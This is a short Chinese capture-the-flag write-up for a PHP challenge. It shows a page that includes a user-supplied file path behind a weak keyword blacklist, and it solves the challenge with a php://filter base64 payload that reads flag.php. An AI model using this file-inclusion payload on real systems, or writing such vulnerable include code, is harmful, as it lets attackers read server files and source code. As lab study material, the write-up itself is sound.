# [极客大挑战 2019]Secret File

## 知识点

`php代码审计`

`php伪协议`

## 解题

找到代码审计点

```
http://76976e53-a4e7-4314-9cbe-bedaeeb61700.node4.buuoj.cn:81/secr3t.php
```

```php
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

发现没有过滤`php://filter`

直接使用`php://filter`读取`flag.php`即可获取`flag`

```
secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```

